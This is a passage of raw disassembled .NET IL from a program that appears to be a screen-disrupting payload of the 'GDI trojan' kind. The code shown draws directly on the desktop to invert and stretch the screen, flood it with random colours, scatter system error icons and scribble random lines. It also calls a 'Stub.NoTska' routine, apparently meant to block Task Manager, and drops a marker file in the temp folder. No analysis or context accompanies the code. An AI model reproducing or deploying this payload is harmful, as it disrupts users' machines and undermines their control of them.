      IL_0cae:  stloc.s    V_21
      IL_0cb0:  ldloca.s   V_21
      IL_0cb2:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0cb7:  stloc.s    V_27
      IL_0cb9:  ldloc.s    V_25
      IL_0cbb:  ldc.i4.0
      IL_0cbc:  ldc.i4.0
      IL_0cbd:  ldloc.s    V_26
      IL_0cbf:  ldloc.s    V_27
      IL_0cc1:  ldloc.s    V_25
      IL_0cc3:  ldc.i4.0
      IL_0cc4:  ldc.i4.0
      IL_0cc5:  ldloc.s    V_26
      IL_0cc7:  ldloc.s    V_27
      IL_0cc9:  ldc.i4     0x330008
      IL_0cce:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0cd3:  pop
      IL_0cd4:  br         IL_1b66

      IL_0cd9:  call       native int j.OK::GetDesktopWindow()
      IL_0cde:  call       native int j.OK::GetWindowDC(native int)
      IL_0ce3:  stloc.s    V_28
      IL_0ce5:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0cea:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0cef:  stloc.s    V_21
      IL_0cf1:  ldloca.s   V_21
      IL_0cf3:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0cf8:  stloc.s    V_29
      IL_0cfa:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0cff:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0d04:  stloc.s    V_21
      IL_0d06:  ldloca.s   V_21
      IL_0d08:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0d0d:  stloc.s    V_30
      IL_0d0f:  ldloc.s    V_28
      IL_0d11:  ldc.i4.0
      IL_0d12:  ldc.i4.0
      IL_0d13:  ldloc.s    V_29
      IL_0d15:  ldloc.s    V_30
      IL_0d17:  ldloc.s    V_28
      IL_0d19:  ldc.i4.0
      IL_0d1a:  ldc.i4.0
      IL_0d1b:  ldloc.s    V_29
      IL_0d1d:  ldloc.s    V_30
      IL_0d1f:  ldc.i4     0xff0062
      IL_0d24:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0d29:  pop
      IL_0d2a:  br         IL_1b66

      IL_0d2f:  call       native int j.OK::GetDesktopWindow()
      IL_0d34:  call       native int j.OK::GetWindowDC(native int)
      IL_0d39:  stloc.s    V_31
      IL_0d3b:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0d40:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0d45:  stloc.s    V_21
      IL_0d47:  ldloca.s   V_21
      IL_0d49:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0d4e:  stloc.s    V_32
      IL_0d50:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0d55:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0d5a:  stloc.s    V_21
      IL_0d5c:  ldloca.s   V_21
      IL_0d5e:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0d63:  stloc.s    V_33
      IL_0d65:  ldloc.s    V_31
      IL_0d67:  ldc.i4.0
      IL_0d68:  ldc.i4.0
      IL_0d69:  ldloc.s    V_32
      IL_0d6b:  ldloc.s    V_33
      IL_0d6d:  ldloc.s    V_31
      IL_0d6f:  ldc.i4.0
      IL_0d70:  ldc.i4.0
      IL_0d71:  ldloc.s    V_32
      IL_0d73:  ldloc.s    V_33
      IL_0d75:  ldc.i4.s   66
      IL_0d77:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0d7c:  pop
      IL_0d7d:  br         IL_1b66

      IL_0d82:  call       native int j.OK::GetDesktopWindow()
      IL_0d87:  call       native int j.OK::GetWindowDC(native int)
      IL_0d8c:  stloc.s    V_34
      IL_0d8e:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0d93:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0d98:  stloc.s    V_21
      IL_0d9a:  ldloca.s   V_21
      IL_0d9c:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0da1:  stloc.s    V_35
      IL_0da3:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0da8:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0dad:  stloc.s    V_21
      IL_0daf:  ldloca.s   V_21
      IL_0db1:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0db6:  stloc.s    V_36
      IL_0db8:  ldloc.s    V_34
      IL_0dba:  ldc.i4.s   25
      IL_0dbc:  ldc.i4.s   25
      IL_0dbe:  ldloc.s    V_35
      IL_0dc0:  ldc.i4.s   50
      IL_0dc2:  sub.ovf
      IL_0dc3:  ldloc.s    V_36
      IL_0dc5:  ldc.i4.s   50
      IL_0dc7:  sub.ovf
      IL_0dc8:  ldloc.s    V_34
      IL_0dca:  ldc.i4.0
      IL_0dcb:  ldc.i4.0
      IL_0dcc:  ldloc.s    V_35
      IL_0dce:  ldloc.s    V_36
      IL_0dd0:  ldc.i4     0xcc0020
      IL_0dd5:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0dda:  pop
      IL_0ddb:  br         IL_1b66

      IL_0de0:  ldstr      "on"
      IL_0de5:  stsfld     string j.OK::NTTA
      IL_0dea:  call       void Stub.NoTska::Start()
      IL_0def:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0df4:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_0df9:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0dfe:  ldstr      "select.dat"
      IL_0e03:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0e08:  ldc.i4.1
      IL_0e09:  callvirt   instance class [mscorlib]System.IO.StreamWriter [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::OpenTextFileWriter(string,
                                                                                                                                                                       bool)
      IL_0e0e:  dup
      IL_0e0f:  ldstr      "002"
      IL_0e14:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_0e19:  callvirt   instance void [mscorlib]System.IO.StreamWriter::Close()
      .try
      {
        IL_0e1e:  newobj     instance void Form1::.ctor()
        IL_0e23:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::Show()
        IL_0e28:  leave      IL_1b66

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0e2d:  dup
        IL_0e2e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e33:  stloc.s    V_37
        IL_0e35:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0e3a:  leave      IL_1b66

      }  // end handler
      IL_0e3f:  ldstr      "Love"
      IL_0e44:  stsfld     string j.OK::NTTA
      .try
      {
        IL_0e49:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0e4e:  ldstr      "select.dat"
        IL_0e53:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0e58:  call       bool [mscorlib]System.IO.File::Exists(string)
        IL_0e5d:  brfalse.s  IL_0e73

        IL_0e5f:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0e64:  ldstr      "select.dat"
        IL_0e69:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0e6e:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0e73:  leave      IL_1b66

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0e78:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e7d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0e82:  leave      IL_1b66

      }  // end handler
      IL_0e87:  call       native int j.OK::GetDesktopWindow()
      IL_0e8c:  call       native int j.OK::GetWindowDC(native int)
      IL_0e91:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0e96:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0e9b:  stloc.s    V_21
      IL_0e9d:  ldloca.s   V_21
      IL_0e9f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0ea4:  stloc.s    V_38
      IL_0ea6:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0eab:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0eb0:  stloc.s    V_21
      IL_0eb2:  ldloca.s   V_21
      IL_0eb4:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0eb9:  stloc.s    V_39
      IL_0ebb:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_0ec0:  ldc.i4.0
      IL_0ec1:  ldc.i4     0x1000000
      IL_0ec6:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_0ecb:  conv.ovf.u4
      IL_0ecc:  call       native int j.OK::CreateSolidBrush(uint32)
      IL_0ed1:  stloc.s    V_40
      IL_0ed3:  dup
      IL_0ed4:  ldloc.s    V_40
      IL_0ed6:  call       native int j.OK::SelectObject(native int,
                                                         native int)
      IL_0edb:  pop
      IL_0edc:  ldc.i4.0
      IL_0edd:  ldc.i4.0
      IL_0ede:  ldloc.s    V_38
      IL_0ee0:  ldloc.s    V_39
      IL_0ee2:  ldc.i4     0x5a0049
      IL_0ee7:  call       bool j.OK::PatBlt(native int,
                                             int32,
                                             int32,
                                             int32,
                                             int32,
                                             valuetype j.OK/TernaryRasterOperations)
      IL_0eec:  pop
      IL_0eed:  ldloc.s    V_40
      IL_0eef:  call       bool j.OK::DeleteObject(native int)
      IL_0ef4:  pop
      IL_0ef5:  br         IL_1b66

      IL_0efa:  call       native int j.OK::GetDesktopWindow()
      IL_0eff:  stloc.s    V_41
      IL_0f01:  ldloc.s    V_41
      IL_0f03:  call       native int j.OK::GetWindowDC(native int)
      IL_0f08:  stloc.s    V_42
      IL_0f0a:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0f0f:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0f14:  stloc.s    V_21
      IL_0f16:  ldloca.s   V_21
      IL_0f18:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0f1d:  stloc.s    V_43
      IL_0f1f:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0f24:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0f29:  stloc.s    V_21
      IL_0f2b:  ldloca.s   V_21
      IL_0f2d:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0f32:  stloc.s    V_44
      IL_0f34:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_0f39:  stloc.s    V_45
      IL_0f3b:  ldc.i4.0
      IL_0f3c:  stloc.s    V_46
      IL_0f3e:  ldloc.s    V_45
      IL_0f40:  ldc.i4.6
      IL_0f41:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_0f46:  stloc.s    V_52
      IL_0f48:  ldloc.s    V_52
      IL_0f4a:  switch     ( 
                            IL_0f69,
                            IL_0f72,
                            IL_0f7b,
                            IL_0f84,
                            IL_0f8d,
                            IL_0f96)
      IL_0f67:  br.s       IL_0f9d

      IL_0f69:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Error()
      IL_0f6e:  stloc.s    V_47
      IL_0f70:  br.s       IL_0f9d

      IL_0f72:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Warning()
      IL_0f77:  stloc.s    V_47
      IL_0f79:  br.s       IL_0f9d

      IL_0f7b:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Information()
      IL_0f80:  stloc.s    V_47
      IL_0f82:  br.s       IL_0f9d

      IL_0f84:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_WinLogo()
      IL_0f89:  stloc.s    V_47
      IL_0f8b:  br.s       IL_0f9d

      IL_0f8d:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Shield()
      IL_0f92:  stloc.s    V_47
      IL_0f94:  br.s       IL_0f9d

      IL_0f96:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Application()
      IL_0f9b:  stloc.s    V_47
      IL_0f9d:  ldloc.s    V_47
      IL_0f9f:  callvirt   instance int32 [System.Drawing]System.Drawing.Icon::get_Width()
      IL_0fa4:  stloc.s    V_48
      IL_0fa6:  ldloc.s    V_47
      IL_0fa8:  callvirt   instance int32 [System.Drawing]System.Drawing.Icon::get_Height()
      IL_0fad:  stloc.s    V_49
      IL_0faf:  ldloc.s    V_45
      IL_0fb1:  ldloc.s    V_43
      IL_0fb3:  ldloc.s    V_48
      IL_0fb5:  sub.ovf
      IL_0fb6:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_0fbb:  stloc.s    V_50
      IL_0fbd:  ldloc.s    V_45
      IL_0fbf:  ldloc.s    V_44
      IL_0fc1:  ldloc.s    V_49
      IL_0fc3:  sub.ovf
      IL_0fc4:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_0fc9:  stloc.s    V_51
      IL_0fcb:  ldloc.s    V_42
      IL_0fcd:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromHdc(native int)
      IL_0fd2:  dup
      IL_0fd3:  ldloc.s    V_47
      IL_0fd5:  ldloc.s    V_50
      IL_0fd7:  ldloc.s    V_51
      IL_0fd9:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawIcon(class [System.Drawing]System.Drawing.Icon,
                                                                                           int32,
                                                                                           int32)
      IL_0fde:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_0fe3:  ldloc.s    V_46
      IL_0fe5:  ldc.i4.1
      IL_0fe6:  add.ovf
      IL_0fe7:  stloc.s    V_46
      IL_0fe9:  ldloc.s    V_46
      IL_0feb:  ldc.i4.s   10
      IL_0fed:  ble        IL_0f3e

      IL_0ff2:  ldloc.s    V_41
      IL_0ff4:  ldloc.s    V_42
      IL_0ff6:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_0ffb:  pop
      IL_0ffc:  br         IL_1b66

      IL_1001:  call       native int j.OK::GetDesktopWindow()
      IL_1006:  stloc.s    V_53
      IL_1008:  ldloc.s    V_53
      IL_100a:  call       native int j.OK::GetWindowDC(native int)
      IL_100f:  stloc.s    V_54
      IL_1011:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1016:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_101b:  stloc.s    V_21
      IL_101d:  ldloca.s   V_21
      IL_101f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_1024:  stloc.s    V_55
      IL_1026:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_102b:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1030:  stloc.s    V_21
      IL_1032:  ldloca.s   V_21
      IL_1034:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_1039:  stloc.s    V_56
      IL_103b:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Black()
      IL_1040:  ldc.r4     10.
      IL_1045:  newobj     instance void [System.Drawing]System.Drawing.Pen::.ctor(valuetype [System.Drawing]System.Drawing.Color,
                                                                                   float32)
      IL_104a:  stloc.s    V_57
      IL_104c:  ldloc.s    V_57
      IL_104e:  ldc.i4.2
      IL_104f:  callvirt   instance void [System.Drawing]System.Drawing.Pen::set_StartCap(valuetype [System.Drawing]System.Drawing.Drawing2D.LineCap)
      IL_1054:  ldloc.s    V_57
      IL_1056:  ldc.i4.2
      IL_1057:  callvirt   instance void [System.Drawing]System.Drawing.Pen::set_EndCap(valuetype [System.Drawing]System.Drawing.Drawing2D.LineCap)
      IL_105c:  ldloc.s    V_54
      IL_105e:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromHdc(native int)
      IL_1063:  stloc.s    V_58
      IL_1065:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::.ctor()
      IL_106a:  stloc.s    V_59
      IL_106c:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_1071:  stloc.s    V_60
      IL_1073:  ldloc.s    V_59
      IL_1075:  ldloc.s    V_60
      IL_1077:  ldloc.s    V_55
      IL_1079:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_107e:  ldloc.s    V_60
      IL_1080:  ldloc.s    V_56
      IL_1082:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_1087:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_108c:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Add(!0)
      IL_1091:  ldc.i4.1
      IL_1092:  stloc.s    V_61
      IL_1094:  ldloc.s    V_60
      IL_1096:  ldc.i4     0x100
      IL_109b:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_10a0:  ldloc.s    V_60
      IL_10a2:  ldc.i4     0x100
      IL_10a7:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_10ac:  ldloc.s    V_60
      IL_10ae:  ldc.i4     0x100
      IL_10b3:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_10b8:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         int32,
                                                                                                                         int32)
      IL_10bd:  stloc.s    V_62
      IL_10bf:  ldloc.s    V_57
      IL_10c1:  ldloc.s    V_62
      IL_10c3:  callvirt   instance void [System.Drawing]System.Drawing.Pen::set_Color(valuetype [System.Drawing]System.Drawing.Color)
      IL_10c8:  ldloc.s    V_57
      IL_10ca:  ldc.r4     15.
      IL_10cf:  callvirt   instance void [System.Drawing]System.Drawing.Pen::set_Width(float32)
      IL_10d4:  ldloc.s    V_59
      IL_10d6:  ldloc.s    V_61
      IL_10d8:  ldc.i4.1
      IL_10d9:  sub.ovf
      IL_10da:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_10df:  stloc.s    V_68
      IL_10e1:  ldloca.s   V_68
      IL_10e3:  call       instance int32 [System.Drawing]System.Drawing.Point::get_X()
      IL_10e8:  ldloc.s    V_60
      IL_10ea:  ldc.i4.s   -50
      IL_10ec:  ldc.i4.s   51
      IL_10ee:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_10f3:  add.ovf
      IL_10f4:  stloc.s    V_63
      IL_10f6:  ldloc.s    V_59
      IL_10f8:  ldloc.s    V_61
      IL_10fa:  ldc.i4.1
      IL_10fb:  sub.ovf
      IL_10fc:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_1101:  stloc.s    V_68
      IL_1103:  ldloca.s   V_68
      IL_1105:  call       instance int32 [System.Drawing]System.Drawing.Point::get_Y()
      IL_110a:  ldloc.s    V_60
      IL_110c:  ldc.i4.s   -50
      IL_110e:  ldc.i4.s   51
      IL_1110:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_1115:  add.ovf
      IL_1116:  stloc.s    V_64
      IL_1118:  ldloc.s    V_59
      IL_111a:  ldloc.s    V_61
      IL_111c:  ldc.i4.1
      IL_111d:  sub.ovf
      IL_111e:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_1123:  stloc.s    V_68
      IL_1125:  ldloca.s   V_68
      IL_1127:  call       instance int32 [System.Drawing]System.Drawing.Point::get_X()
      IL_112c:  ldloc.s    V_60
      IL_112e:  ldc.i4.s   -50
      IL_1130:  ldc.i4.s   51
      IL_1132:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_1137:  add.ovf
      IL_1138:  stloc.s    V_65
      IL_113a:  ldloc.s    V_59
      IL_113c:  ldloc.s    V_61
      IL_113e:  ldc.i4.1
      IL_113f:  sub.ovf
      IL_1140:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_1145:  stloc.s    V_68
      IL_1147:  ldloca.s   V_68
      IL_1149:  call       instance int32 [System.Drawing]System.Drawing.Point::get_Y()
      IL_114e:  ldloc.s    V_60
      IL_1150:  ldc.i4.s   -50
      IL_1152:  ldc.i4.s   51
      IL_1154:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_1159:  add.ovf
      IL_115a:  stloc.s    V_66
      IL_115c:  ldloc.s    V_60
      IL_115e:  ldloc.s    V_55
      IL_1160:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_1165:  ldloc.s    V_60
      IL_1167:  ldloc.s    V_56
      IL_1169:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_116e:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_1173:  stloc.s    V_67
      IL_1175:  ldloc.s    V_59
      IL_1177:  ldloc.s    V_67
      IL_1179:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Add(!0)
      IL_117e:  ldloc.s    V_58
      IL_1180:  ldloc.s    V_57
      IL_1182:  ldloc.s    V_59
      IL_1184:  ldloc.s    V_61
      IL_1186:  ldc.i4.1
      IL_1187:  sub.ovf
      IL_1188:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_118d:  ldloc.s    V_63
      IL_118f:  ldloc.s    V_64
      IL_1191:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_1196:  ldloc.s    V_65
      IL_1198:  ldloc.s    V_66
      IL_119a:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_119f:  ldloc.s    V_67
      IL_11a1:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawBezier(class [System.Drawing]System.Drawing.Pen,
                                                                                             valuetype [System.Drawing]System.Drawing.Point,
                                                                                             valuetype [System.Drawing]System.Drawing.Point,
                                                                                             valuetype [System.Drawing]System.Drawing.Point,
                                                                                             valuetype [System.Drawing]System.Drawing.Point)
      IL_11a6:  ldloc.s    V_61
      IL_11a8:  ldc.i4.1
      IL_11a9:  add.ovf
      IL_11aa:  stloc.s    V_61
      IL_11ac:  ldloc.s    V_61
      IL_11ae:  ldc.i4.s   99
      IL_11b0:  ble        IL_1094

      IL_11b5:  ldloc.s    V_57
      IL_11b7:  callvirt   instance void [System.Drawing]System.Drawing.Pen::Dispose()
      IL_11bc:  ldloc.s    V_58
      IL_11be:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_11c3:  ldloc.s    V_53
      IL_11c5:  ldloc.s    V_54
      IL_11c7:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_11cc:  pop
      IL_11cd:  br         IL_1b66

      IL_11d2:  call       native int j.OK::GetDesktopWindow()
      IL_11d7:  stloc.s    V_69
      IL_11d9:  ldloc.s    V_69
      IL_11db:  call       native int j.OK::GetWindowDC(native int)
      IL_11e0:  stloc.s    V_70
      IL_11e2:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_11e7:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_11ec:  stloc.s    V_21
      IL_11ee:  ldloca.s   V_21
      IL_11f0:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_11f5:  stloc.s    V_71
      IL_11f7:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_11fc:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1201:  stloc.s    V_21
      IL_1203:  ldloca.s   V_21
      IL_1205:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_120a:  stloc.s    V_72
      IL_120c:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_1211:  stloc.s    V_73
      IL_1213:  ldc.i4.0
      IL_1214:  stloc.s    V_74
      IL_1216:  ldloc.s    V_73
      IL_1218:  ldc.i4.6
      IL_1219:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_121e:  stloc.s    V_80
      IL_1220:  ldloc.s    V_80
      IL_1222:  switch     ( 
                            IL_1241,
                            IL_124a,
                            IL_1253,
                            IL_125c,
                            IL_1265,
                            IL_126e)
      IL_123f:  br.s       IL_1275

      IL_1241:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Error()
      IL_1246:  stloc.s    V_75
      IL_1248:  br.s       IL_1275

      IL_124a:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Warning()
      IL_124f:  stloc.s    V_75
      IL_1251:  br.s       IL_1275

      IL_1253:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Information()
      IL_1258:  stloc.s    V_75
      IL_125a:  br.s       IL_1275

      IL_125c:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_WinLogo()
      IL_1261:  stloc.s    V_75
      IL_1263:  br.s       IL_1275

      IL_1265:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Shield()
      IL_126a:  stloc.s    V_75
      IL_126c:  br.s       IL_1275

      IL_126e:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Application()
      IL_1273:  stloc.s    V_75
      IL_1275:  ldloc.s    V_75
      IL_1277:  callvirt   instance int32 [System.Drawing]System.Drawing.Icon::get_Width()
      IL_127c:  stloc.s    V_76
      IL_127e:  ldloc.s    V_75
      IL_1280:  callvirt   instance int32 [System.Drawing]System.Drawing.Icon::get_Height()
      IL_1285:  stloc.s    V_77
      IL_1287:  ldloc.s    V_73
      IL_1289:  ldloc.s    V_71
      IL_128b:  ldloc.s    V_76
      IL_128d:  sub.ovf
      IL_128e:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_1293:  stloc.s    V_78
      IL_1295:  ldloc.s    V_73
      IL_1297:  ldloc.s    V_72
      IL_1299:  ldloc.s    V_77
      IL_129b:  sub.ovf
